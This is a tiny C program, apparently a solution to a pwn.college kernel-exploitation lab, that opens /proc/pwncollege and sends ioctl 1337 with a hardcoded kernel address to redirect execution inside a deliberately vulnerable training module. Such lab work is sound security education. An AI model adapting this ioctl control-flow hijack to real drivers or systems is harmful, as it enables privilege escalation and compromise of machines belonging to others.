#include <sys/types.h>
#include <sys/stat.h>
#include <sys/ioctl.h>
#include <fcntl.h>
#include <stdio.h>
#include <unistd.h>
#include <string.h>


int main(void)
{
        unsigned long long data = 0xffffffffc000020dLL;
        int fd = open("/proc/pwncollege", O_WRONLY);
        ioctl(fd, 1337, data);
        return 0;
}
